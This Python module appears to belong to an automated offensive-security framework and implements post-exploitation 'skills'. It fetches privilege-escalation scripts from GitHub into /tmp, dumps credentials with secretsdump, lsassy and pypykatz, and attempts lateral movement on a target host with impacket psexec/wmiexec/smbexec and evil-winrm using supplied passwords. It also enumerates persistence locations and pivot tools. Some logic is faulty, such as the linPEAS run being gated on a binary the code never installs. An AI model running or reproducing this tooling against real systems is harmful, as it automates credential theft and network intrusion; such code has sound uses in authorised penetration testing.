"""PostEx Skill - Post Exploitation Techniques"""
import shutil, subprocess, time, platform
from typing import Any
import structlog
from specter.skills.base import BaseSkill, SkillResult, RiskLevel

logger = structlog.get_logger()

class PostExSkill(BaseSkill):
    name = "postex"
    description = "Post-exploitation techniques"
    category = "postex"
    risk_level = RiskLevel.INTRUSIVE

    def __init__(self):
        super().__init__()
        self.tools = ["postex.priv_esc","postex.credential_dump","postex.lateral_movement","postex.persistence","postex.pivot_setup"]
        self.workflows = ["post_exploitation","lateral_movement_chain"]

    def get_available_actions(self):
        return ["priv_esc","priv_esc_linux","priv_esc_windows","credential_dump","lateral_movement","persistence","pivot_setup"]

    async def validate_params(self, action, params):
        return "target" in params if action in ("lateral_movement","pivot_setup") else True

    async def execute(self, action, params):
        start = time.time()
        m = {"priv_esc":self._priv_esc,"priv_esc_linux":self._priv_esc_linux,"priv_esc_windows":self._priv_esc_windows,"credential_dump":self._cred_dump,"lateral_movement":self._lateral,"persistence":self._persistence,"pivot_setup":self._pivot}
        fn = m.get(action)
        return await fn(params, start) if fn else SkillResult(success=False, error=f"Accion desconocida: {action}")

    async def _priv_esc(self, p, s):
        if platform.system() == "Windows": return await self._priv_esc_windows(p, s)
        return await self._priv_esc_linux(p, s)

    async def _priv_esc_linux(self, p, s):
        findings, out_parts = [], []
        for name, cmd in [("linpeas",["curl","-L","https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh","-o","/tmp/linpeas.sh"]),("lse",["curl","-L","https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh","-o","/tmp/lse.sh"])]:
            try:
                r = subprocess.run(cmd,capture_output=True,text=True,timeout=60)
                if r.returncode == 0:
                    out_parts.append(f"Downloaded {name}")
                    findings.append({"type":"tool_downloaded","tool":name})
            except Exception: pass
        if shutil.which("linpeas"):
            try:
                r = subprocess.run(["bash","/tmp/linpeas.sh","-a"],capture_output=True,text=True,timeout=300)
                out_parts.append(r.stdout+r.stderr)
                for line in r.stdout.split("\n"):
                    if any(k in line.lower() for k in ["vuln","misconfig","suid","sudo","writable","password"]):
                        findings.append({"type":"priv_esc_hint","detail":line.strip()[:200]})
            except Exception: pass
        if not findings: findings.append({"type":"priv_esc","value":"No findings"})
        return SkillResult(success=True,output="\n".join(out_parts),findings=findings,execution_time=time.time()-s)

    async def _priv_esc_windows(self, p, s):
        findings, out_parts = [], []
        if shutil.which("winPEASx64.exe"):
            try:
                r = subprocess.run(["winPEASx64.exe","cmd"],capture_output=True,text=True,timeout=300)
                out_parts.append(r.stdout+r.stderr)
                for line in r.stdout.split("\n"):
                    if any(k in line.lower() for k in ["vuln","misconfig","unquoted","service","password","registry"]):
                        findings.append({"type":"priv_esc_hint","detail":line.strip()[:200]})
            except Exception: pass
        if shutil.which("PowerShell"):
            try:
                ps_cmd = "Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.State -eq 'Running'} | Select-Object Name,PathName,StartName"
                r = subprocess.run(["powershell","-Command",ps_cmd],capture_output=True,text=True,timeout=60)
                out_parts.append(r.stdout)
            except Exception: pass
        if not findings: findings.append({"type":"priv_esc_windows","value":"No findings"})
        return SkillResult(success=True,output="\n".join(out_parts),findings=findings,execution_time=time.time()-s)

    async def _cred_dump(self, p, s):
        findings, out_parts = [], []
        for name, cmd in [("secretsdump",["secretsdump.py","-system","/tmp/SYSTEM","-sam","/tmp/SAM","LOCAL"]),("lsassy",["lsassy","-d",p.get("domain",""),"-u",p.get("user",""),"-p",p.get("password",""),p.get("target","")]),("pypykatz",["pypykatz","lsa","minidump",p.get("dump","")])]:
            if shutil.which(name):
                try:
                    r = subprocess.run(cmd,capture_output=True,text=True,timeout=120)
                    out_parts.append(r.stdout+r.stderr)
                    if r.returncode == 0: findings.append({"type":"credential_dump","tool":name})
                except Exception: pass
        if not findings: findings.append({"type":"cred_dump","value":"No credential dump tools available"})
        return SkillResult(success=True,output="\n".join(out_parts),findings=findings,execution_time=time.time()-s)

    async def _lateral(self, p, s):
        target = p.get("target","")
        if not target: return SkillResult(success=False,error="Target required",execution_time=time.time()-s)
        findings, out_parts = [], []
        for name in [("psexec.py","impacket-psexec"),("wmiexec.py","impacket-wmiexec"),("smbexec.py","impacket-smbexec"),("evil-winrm","evil-winrm")]:
            tool = next((n for n in name if shutil.which(n)),None)
            if tool:
                d,u,pw = p.get("domain",""),p.get("user",""),p.get("password","")
                creds = f"{d}/{u}:{pw}" if u and pw else f"{d}/"
                cmd = [tool,creds,target] if tool != "evil-winrm" else ["evil-winrm","-i",target,"-u",u,"-p",pw]
                try:
                    r = subprocess.run(cmd,capture_output=True,text=True,timeout=120)
                    out_parts.append(r.stdout+r.stderr)
                    if r.returncode == 0: findings.append({"type":"lateral_movement","tool":tool,"target":target})
                except Exception: continue
        if not findings: findings.append({"type":"lateral","value":"No lateral movement tools succeeded"})
        return SkillResult(success=True,output="\n".join(out_parts),findings=findings,execution_time=time.time()-s)

    async def _persistence(self, p, s):
        findings = []
        if platform.system() == "Linux":
            cmds = [
                "echo '# Persistence: cron job' && crontab -l 2>/dev/null | grep -v '^#' | head -20",
                "ls -la /etc/systemd/system/*.service 2>/dev/null | head -20",
                "cat /etc/rc.local 2>/dev/null",
            ]
        else:
            cmds = [
                "powershell -Command \"Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select-Object TaskName,TaskPath | Format-Table\"",
                "powershell -Command \"Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\"",
                "powershell -Command \"Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\"",
            ]
        out_parts = []
        for cmd in cmds:
            try:
                shell = ["cmd.exe","/c",cmd] if platform.system()=="Windows" else ["/bin/sh","-c",cmd]
                r = subprocess.run(shell,capture_output=True,text=True,timeout=30)
                out_parts.append(r.stdout)
                if r.stdout.strip(): findings.append({"type":"persistence_check","detail":r.stdout.strip()[:500]})
            except Exception: pass
        if not findings: findings.append({"type":"persistence","value":"No persistence mechanisms found"})
        return SkillResult(success=True,output="\n".join(out_parts),findings=findings,execution_time=time.time()-s)

    async def _pivot(self, p, s):
        target = p.get("target","")
        if not target: return SkillResult(success=False,error="Target required",execution_time=time.time()-s)
        findings, out_parts = [], []
        for name, cmd in [("chisel",["chisel","server","--reverse","-p","8080"]),("sshuttle",["sshuttle","-r",p.get("user","root")+f"@{target}","0.0.0.0/0"]),("ligolo-ng",["ligolo-ng-proxy","-l","0.0.0.0:11601"])]:
            if shutil.which(name):
                out_parts.append(f"Pivot tool available: {name} - cmd: {' '.join(cmd)}")
                findings.append({"type":"pivot_tool","tool":name})
        if not findings: findings.append({"type":"pivot","value":"No pivot tools available"})
        return SkillResult(success=True,output="\n".join(out_parts),findings=findings,execution_time=time.time()-s)
